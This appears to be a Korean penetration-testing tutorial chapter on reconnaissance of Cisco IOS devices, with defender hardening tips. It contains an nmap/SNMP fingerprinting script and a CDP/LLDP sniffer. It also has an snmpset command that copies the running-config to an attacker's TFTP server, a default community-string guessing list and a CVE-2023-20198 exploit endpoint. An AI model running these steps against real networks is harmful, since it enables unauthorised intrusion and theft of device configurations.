# 32-01. Cisco IOS 구조 이해와 장비 정찰

> **한 줄 요약**: 네트워크 장비 침투는 "이 장비가 뭐고, 누가 어떻게 관리하는가"를 파악하는 정찰이 전체의 70%다.
> OS 내부 구조와 관리 프로토콜 특성을 알면 어디에 공격 지점이 있는지 지도가 그려진다.

## 1. 운영체제 계보 — 무엇이 다른가

Cisco 장비를 쓴다고 해서 전부 같은 OS가 아닙니다. 보안 관점에서 중요한 차이가 있습니다.

| OS | 특징 | 대표 플랫폼 | 공격 표면의 차이점 |
|----|------|-------------|--------------------|
| **IOS (클래식)** | 단일 바이너리, 단일 메모리 공간 | Catalyst 2900/3500, ISR G1 | 한 프로세스 크래시 = 장비 재부팅 |
| **IOS XE** | Linux 커널 위에 IOSd 프로세스 | Catalyst 9000, ISR 4000, ASR 1000 | Linux 공격면(bash, 컨테이너) 추가, Web UI 존재 |
| **IOS XR** | QNX→Linux 커널, 마이크로커널 스타일 | ASR 9000, NCS | BGP 같은 개별 프로세스 크래시 가능, 복구는 빠름 |
| **NX-OS** | Linux 기반, 가상 디바이스 컨텍스트(VDC) 지원 | Nexus 시리즈 | guestshell(배시) 접근 가능, vPC·FabricPath 공격 표면 |

**실무 인식 팁**:
- `show version` 출력의 첫 번째 줄이 "IOS Software" → 클래식 IOS
- "IOS XE Software" → IOS XE (가장 흔한 현대 공격 표적)
- "NX-OS" → 데이터센터 Nexus 스위치

**왜 이게 중요한가**: IOS XE는 **Web UI (HTTP Server)** 를 내장합니다. CVE-2023-20198이 바로 이 Web UI 인증 우회로 전 세계 수만 대의 Cisco IOS XE 장비가 실제로 털렸습니다. "누가 라우터 웹 UI를 쓰겠냐"는 가정이 무너진 사건이었습니다.

## 2. 메모리·파일시스템 레이아웃 — 설정 파일은 어디 있는가

클래식 IOS에서의 저장 영역:

```
flash:                 ← OS 이미지 (c2800nm-advipservicesk9-mz.bin 등)
nvram:startup-config   ← 부팅 시 로드되는 설정
system:running-config  ← 현재 메모리에 올라간 설정 (편집 대상)
tftp://<ip>/...        ← 외부 TFTP 서버 (설정 백업·원격 로드)
```

IOS XE는 추가로 Linux 파일시스템이 있습니다:

```
bootflash:             ← 부팅 이미지
harddisk:              ← 운영체제 파일들 (IOSd 바이너리 포함)
/tmp, /var             ← Linux 루트파일시스템 일부
```

**공격자 관점**: IOS XE에서 `guestshell enable` 이 되어 있으면 **bash 쉘을 얻을 수 있습니다**. 적법한 진단 목적 기능이지만, 관리자가 설정해두고 잊으면 측면 이동의 발판이 됩니다.

## 3. 관리 평면 포트 — 무엇이 열려있는가

표준 관리 서비스와 기본 포트입니다. 정찰 단계에서 가장 먼저 스캔합니다.

| 서비스 | 포트 | 보안 관점 |
|--------|------|-----------|
| Telnet | 23/tcp | **평문**. 여전히 많이 쓰임, 스니핑 시 credential 그대로 |
| SSH | 22/tcp | 프로토콜 v2만 허용하는지, 공개키 인증 강제 여부 |
| HTTP | 80/tcp | Web UI. IOS XE에서 기본 켜짐 가능 (CVE-2023-20198 표적) |
| HTTPS | 443/tcp | 같음, TLS 1.0 쓰는지 주의 |
| SNMP | 161/udp | v1/v2c는 커뮤니티 스트링 평문 |
| NETCONF | 830/tcp | SSH 위의 XML RPC, 인증 우회 취약점 이력 |
| RESTCONF | 443/tcp | HTTPS 위의 REST |
| TACACS+ | 49/tcp | 인증 서버와의 통신. 키 약하면 스니핑 가능 |
| Syslog | 514/udp | 로그 유출 경로 (UDP 스푸핑으로 가짜 로그 주입 가능) |

## 4. 장비 핑거프린팅 스크립트 (Python + nmap)

직접 만들어둔 정찰 스크립트입니다. `show banner`를 받거나, SNMP sysDescr을 얻거나, SSH 배너를 파싱해 **장비 종류/버전**을 최대한 좁힙니다.

```python
#!/usr/bin/env python3
"""device_fingerprint.py — 네트워크 장비의 OS·버전을 원격에서 추정한다.

사용 예:
    python3 device_fingerprint.py 10.0.0.1
    python3 device_fingerprint.py --subnet 10.0.0.0/24 --workers 32

전제:
    - nmap이 설치되어 있어야 한다 (apt install nmap)
    - SNMP v1/v2c 커뮤니티 'public'을 먼저 시도한다
"""
from __future__ import annotations

import argparse                          # 커맨드라인 인자 파싱
import concurrent.futures                # 병렬 스캔을 위한 스레드 풀
import ipaddress                         # CIDR → 개별 IP 변환
import json                              # 결과 직렬화
import re                                # 버전 문자열 추출용 정규식
import socket                            # TCP 배너 그래빙
import subprocess                        # nmap 호출
from dataclasses import asdict, dataclass, field
from typing import Literal

# 장비를 탐지할 때 열려 있기를 기대하는 포트 목록.
# 빠른 스캔을 위해 관리 포트만 선별했다. 프로덕션 스캔에선 더 넓힐 수 있다.
MGMT_PORTS = [22, 23, 80, 443, 161, 830]


@dataclass
class DeviceProfile:
    """한 대의 장비에서 얻은 정보를 모아두는 컨테이너.
    후속 분석(JSON 리포트, DB 적재)을 위해 dataclass로 둔다."""
    ip: str
    open_ports: list[int] = field(default_factory=list)        # TCP 스캔 결과
    ssh_banner: str | None = None                              # "SSH-2.0-Cisco-1.25" 같은 라인
    snmp_sysdescr: str | None = None                           # SNMP OID 1.3.6.1.2.1.1.1.0
    telnet_banner: str | None = None                           # 최초 300 바이트
    os_guess: Literal["IOS", "IOS XE", "IOS XR", "NX-OS", "Junos", "unknown"] = "unknown"
    version_guess: str | None = None                           # "15.2(4)M5" 같은 문자열


def tcp_banner(ip: str, port: int, timeout: float = 2.0) -> str | None:
    """단일 TCP 포트에 연결해 첫 수신 바이트를 읽는다.
    SSH·Telnet이 접속 직후 배너를 보내므로 이것만으로도 많은 정보가 들어온다."""
    try:
        # 지정 시간 내 connect+recv가 실패하면 None 반환 — 절대 예외 안 던지게 한다
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            return s.recv(300).decode(errors="ignore")
    except OSError:
        return None


def snmp_sysdescr(ip: str, community: str = "public", timeout: float = 2.0) -> str | None:
    """SNMPv1/v2c로 sysDescr(OID .1.3.6.1.2.1.1.1.0)을 조회한다.
    이 문자열에는 보통 벤더·모델·OS 이름이 평문으로 들어있어 지문 감식 일등공신이다."""
    try:
        # snmpwalk 대신 snmpget을 쓴다 — 단일 OID이므로 가볍다
        result = subprocess.run(
            ["snmpget", "-v", "2c", "-c", community, "-t", str(timeout),
             "-Ovq", ip, "1.3.6.1.2.1.1.1.0"],
            capture_output=True, text=True, timeout=timeout + 2,
        )
        # 정상 응답이면 stdout 첫 줄이 sysDescr 값이다. 따옴표 제거.
        line = result.stdout.strip().strip('"')
        return line or None
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


def nmap_open_ports(ip: str) -> list[int]:
    """nmap -sS (SYN 스캔)으로 관리 포트만 빠르게 확인.
    -Pn 은 ping 생략 (ICMP 차단 환경에서도 동작), --max-retries 1 로 속도 향상."""
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-Pn", "-n", "--max-retries", "1", "-p",
             ",".join(map(str, MGMT_PORTS)), "--open", "-oG", "-", ip],
            capture_output=True, text=True, timeout=30,
        )
        # nmap -oG 출력에서 "Ports: 22/open/..." 형태의 라인을 파싱한다.
        open_ports: list[int] = []
        for tok in re.findall(r"(\d+)/open/", result.stdout):
            open_ports.append(int(tok))
        return sorted(open_ports)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []


def classify(profile: DeviceProfile) -> None:
    """수집한 배너·sysDescr 문자열로 OS와 버전을 추정한다.
    여러 소스의 정보가 일치할 때 신뢰도가 높으므로 우선순위는 SNMP > SSH > Telnet 순."""
    haystacks = " | ".join(filter(None, [profile.snmp_sysdescr, profile.ssh_banner, profile.telnet_banner]))

    # 각 OS의 특징 키워드를 순서대로 시도. 먼저 매치되는 쪽을 채택한다.
    patterns: list[tuple[str, Literal["IOS XE", "IOS XR", "NX-OS", "IOS", "Junos"]]] = [
        (r"IOS[- ]?XE", "IOS XE"),      # "IOS-XE" 또는 "IOS XE"
        (r"IOS[- ]?XR", "IOS XR"),
        (r"NX-?OS",     "NX-OS"),
        (r"Cisco IOS",  "IOS"),          # 위에서 XE/XR이 안 잡혔을 때만 클래식 IOS로 분류
        (r"JUNOS",      "Junos"),
    ]
    for pat, label in patterns:
        if re.search(pat, haystacks, re.IGNORECASE):
            profile.os_guess = label
            break

    # 버전 문자열 추출: "Version 15.2(4)M5" 또는 "16.12.04" 같은 포맷을 잡는다
    version = re.search(r"Version\s+([\w.\(\)]+)", haystacks, re.IGNORECASE)
    if version:
        profile.version_guess = version.group(1)


def scan_one(ip: str) -> DeviceProfile:
    """한 대의 IP에 대해 전체 파이프라인을 돌린다.
    실패한 프로브는 침묵하고 넘어간다 — 대규모 스캔에서 로그가 넘치지 않도록."""
    profile = DeviceProfile(ip=ip)

    profile.open_ports = nmap_open_ports(ip)

    # 열린 포트가 있는 경우에만 후속 프로브를 시도. 닫힌 포트에 찔러봐야 무의미하다.
    if 22 in profile.open_ports:
        profile.ssh_banner = tcp_banner(ip, 22)
    if 23 in profile.open_ports:
        profile.telnet_banner = tcp_banner(ip, 23)
    if 161 in profile.open_ports:
        # UDP라 nmap -sS로는 안 잡히지만, 운영망에서 자주 열려있어 별도 시도한다
        profile.snmp_sysdescr = snmp_sysdescr(ip)

    classify(profile)
    return profile


def main() -> None:
    ap = argparse.ArgumentParser(description="Network device OS/version fingerprinting")
    # 단일 IP 또는 서브넷 중 택일
    group = ap.add_mutually_exclusive_group(required=True)
    group.add_argument("ip", nargs="?", help="단일 대상 IP")
    group.add_argument("--subnet", help="CIDR 표기의 서브넷 (예: 10.0.0.0/24)")
    ap.add_argument("--workers", type=int, default=16, help="동시 스캔 수")
    ap.add_argument("--out", help="결과를 저장할 JSON 경로")
    args = ap.parse_args()

    # 스캔 대상 목록 생성
    if args.subnet:
        targets = [str(ip) for ip in ipaddress.ip_network(args.subnet, strict=False).hosts()]
    else:
        targets = [args.ip]

    results: list[DeviceProfile] = []
    # ThreadPoolExecutor가 소켓 블로킹 I/O에는 GIL 영향을 덜 받아 적합하다
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        for profile in ex.map(scan_one, targets):
            # 열린 포트가 하나도 없으면 리포트에서 생략 — 노이즈 방지
            if profile.open_ports:
                results.append(profile)
                print(f"[{profile.ip:15}] {profile.os_guess:8} "
                      f"ver={profile.version_guess or '?':12} "
                      f"ports={profile.open_ports}")

    # JSON 출력은 선택적. CI·리포트 자동화에 쓸 때만 켠다.
    if args.out:
        with open(args.out, "w") as f:
            json.dump([asdict(p) for p in results], f, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    main()
```

**현장 팁**:
- SSH 배너 `SSH-2.0-Cisco-1.25` 에서 `Cisco-1.25` 는 IOS SSH 구현의 내부 버전입니다. 이 값으로 IOS 메이저 버전을 좁힐 수 있습니다.
- SNMP `sysDescr` 는 보통 `"Cisco IOS Software, C2800 Software (C2800NM-ADVIPSERVICESK9-M), Version 12.4(24)T1, RELEASE SOFTWARE"` 같은 형태로, **이 한 줄만 얻으면 공격 가능 CVE 목록을 거의 바로 좁힐 수 있습니다**.

## 5. CDP/LLDP — 내부자에게만 보이는 금광

스위치 포트에 붙은 노드라면 **CDP**(Cisco Discovery Protocol) 또는 **LLDP** 프레임을 가만히 기다리기만 해도 굉장히 많은 정보가 들어옵니다.

- 장비 모델·IOS 버전·IP·기본 VLAN
- 네이티브 VLAN ID → VLAN hopping 재료
- 관리자가 달아둔 인터페이스 설명 → 네트워크 구조 추측

```python
#!/usr/bin/env python3
"""cdp_lldp_sniffer.py — 스위치 포트에 붙어 CDP/LLDP 프레임에서 정보를 추출한다."""
from __future__ import annotations

import argparse                                           # CLI 인자
from scapy.all import sniff, Ether                        # 기본 패킷 캡처
from scapy.contrib.cdp import CDPv2_HDR, CDPMsgDeviceID, \
    CDPMsgSoftwareVersion, CDPMsgPlatform, CDPMsgPortID, \
    CDPMsgNativeVLAN                                      # CDP TLV 파싱
from scapy.contrib.lldp import LLDPDUSystemName, \
    LLDPDUSystemDescription, LLDPDUChassisID              # LLDP TLV 파싱


def handle_cdp(pkt) -> None:
    """CDP 프레임에서 관심 있는 TLV만 골라 출력한다.
    CDP는 멀티캐스트 01:00:0c:cc:cc:cc 로 송신되며 기본 60초 주기다."""
    if not pkt.haslayer(CDPv2_HDR):
        return
    # 각 TLV 존재 여부를 확인하며 꺼낸다. 없을 수도 있으므로 getlayer 사용.
    device = pkt[CDPMsgDeviceID].val.decode(errors="ignore") if pkt.haslayer(CDPMsgDeviceID) else "?"
    version = pkt[CDPMsgSoftwareVersion].val.decode(errors="ignore") if pkt.haslayer(CDPMsgSoftwareVersion) else "?"
    platform = pkt[CDPMsgPlatform].val.decode(errors="ignore") if pkt.haslayer(CDPMsgPlatform) else "?"
    port = pkt[CDPMsgPortID].iface.decode(errors="ignore") if pkt.haslayer(CDPMsgPortID) else "?"
    # 네이티브 VLAN ID — VLAN hopping 에서 사용할 중요한 값
    nvlan = pkt[CDPMsgNativeVLAN].vlan if pkt.haslayer(CDPMsgNativeVLAN) else "?"

    print(f"[CDP]  {device}  port={port}  platform={platform}  native_vlan={nvlan}")
    # 소프트웨어 버전은 길어서 별도 라인으로
    print(f"       {version.splitlines()[0] if version else '?'}")


def handle_lldp(pkt) -> None:
    """LLDP는 표준 프로토콜이라 이기종 환경에서도 잡힌다.
    멀티캐스트 01:80:c2:00:00:0e 에서 송신."""
    if not pkt.haslayer(LLDPDUChassisID):
        return
    sysname = pkt[LLDPDUSystemName].system_name.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemName) else "?"
    sysdesc = pkt[LLDPDUSystemDescription].description.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemDescription) else "?"
    print(f"[LLDP] {sysname}")
    print(f"       {sysdesc[:120]}")


def dispatcher(pkt) -> None:
    """CDP/LLDP 둘 다 관심 대상이므로 하나의 콜백으로 라우팅."""
    if pkt.haslayer(CDPv2_HDR):
        handle_cdp(pkt)
    elif pkt.haslayer(LLDPDUChassisID):
        handle_lldp(pkt)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True, help="캡처할 네트워크 인터페이스 (예: eth0)")
    ap.add_argument("-c", "--count", type=int, default=0, help="0=무제한, N=N개 받으면 종료")
    args = ap.parse_args()

    # Ethernet dst 멀티캐스트 주소로 BPF 필터를 둬서 CPU 부하를 줄인다
    bpf = "(ether dst 01:00:0c:cc:cc:cc) or (ether dst 01:80:c2:00:00:0e)"
    print(f"[*] Sniffing {args.iface} for CDP/LLDP (filter: {bpf})")
    sniff(iface=args.iface, prn=dispatcher, filter=bpf, count=args.count, store=False)


if __name__ == "__main__":
    main()
```

CDP 프레임은 기본 60초 간격이므로 1-2분만 앉아있으면 주변 스위치 구조가 한눈에 들어옵니다.

**방어자 조언**: 불필요한 포트에서 CDP/LLDP를 끕니다.
```
! 외부로 향하는 인터페이스에서만 꺼도 큰 효과
interface GigabitEthernet0/1
 no cdp enable
 no lldp transmit
 no lldp receive
```

## 6. 원격 설정 파일 획득 경로

### 6.1 SNMP write community로 `config`을 TFTP로 뽑기

SNMPv1/v2c에 **write** 권한 커뮤니티 스트링이 있으면 장비 설정을 통째로 외부 TFTP 서버에 뽑을 수 있습니다. 10년 넘은 고전 기법이지만 지금도 자주 성공합니다.

```bash
# 1) 공격자 TFTP 서버 기동 (Kali 예시)
sudo apt install tftpd-hpa
sudo systemctl start tftpd-hpa
# 기본 디렉토리 /srv/tftp, 쓰기 가능하게 chmod 777 /srv/tftp

# 2) SNMP SET으로 running-config을 TFTP로 푸시하도록 지시 (write community 필요)
#    OID .1.3.6.1.4.1.9.9.96 은 CISCO-CONFIG-COPY-MIB
TARGET=10.0.0.1
TFTP_SRV=10.0.99.99
COMMUNITY=private                 # 실제 환경에선 브루트포스로 탐색한다

# 각 OID의 의미를 하나씩 주석으로 적어두었다
snmpset -v 2c -c $COMMUNITY $TARGET \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.2.101 i 1  `# ProtocolType = TFTP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.3.101 i 4  `# SourceType    = running-config` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.4.101 i 1  `# DestType      = networkFile` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.5.101 a $TFTP_SRV  `# TFTP 서버 IP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.6.101 s cfg.txt    `# 저장 파일명` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.14.101 i 1 `# Action = active (작업 시작)`

# 3) /srv/tftp/cfg.txt 에 running-config이 떨어져 있다
```

### 6.2 HTTP/HTTPS Web UI 취약점 (IOS XE 전용)

CVE-2023-20198 계열처럼 Web UI 인증 우회가 되면 `/webui/logoutconfirm.html?logon_hash=1` 같은 엔드포인트에 POST 한 번으로 **레벨 15 계정을 만들 수 있습니다**. 실제로 2023년 말 수만 대의 공개 라우터에 공격자가 백도어 계정을 심었던 사건이 있었고, 지금도 패치되지 않은 장비가 Shodan에 검색됩니다.

방어는 단순합니다 — **외부 인터페이스에서 HTTP/HTTPS 서버를 끕니다**.

```
no ip http server
no ip http secure-server
```

## 7. 정찰 단계 체크리스트

공격자·방어자 양쪽 모두 다음을 먼저 확인합니다.

**공격자**:
- [ ] TCP 22/23/80/443/830, UDP 161 스캔
- [ ] SNMP 커뮤니티 `public/private/cisco/manager/secret` 사전 시도
- [ ] SSH 배너·sysDescr 로 OS 버전 확보
- [ ] CDP/LLDP 스니핑으로 관리 VLAN·이웃 장비 파악
- [ ] Web UI 존재 확인 → 최신 CVE 검색
- [ ] TFTP 서버 방향 아웃바운드 가능 여부 (설정 exfil 경로)

**방어자**:
- [ ] 관리 평면을 **별도 VRF** 또는 관리 전용 VLAN으로 분리
- [ ] SNMP는 v3만 허용, 읽기 커뮤니티조차 ACL 적용
- [ ] Web UI 끄기. 꼭 써야 하면 관리망에서만 접근
- [ ] SSH 프로토콜 v2 강제, 비밀번호 인증 대신 공개키
- [ ] CDP/LLDP는 트렁크·내부 링크에서만 활성화
- [ ] 로그인 배너에 법적 경고문 명시 (기술적 효과는 없지만 법적 사후 대응용)

## 8. 마무리

OS 계보·파일시스템·관리 포트·지문 감식까지 한 번 정리해 두면, 이후 섹션(02–04)에서 **"어떤 시나리오가 어느 장비·어느 관리 평면 위에서 돌아가는지"** 가 훨씬 명확히 읽힙니다. 네트워크 장비 공격은 고전이지만, 2025년 CVE 목록이 말해주듯 여전히 가장 빠르게 돈이 되는 표적 중 하나입니다.

다음 문서(02)에서는 이 정보를 바탕으로 **Layer 2 공격**, 즉 같은 브로드캐스트 도메인 안에서 어떻게 VLAN 경계를 넘고 스위치를 속이는지를 다룹니다.
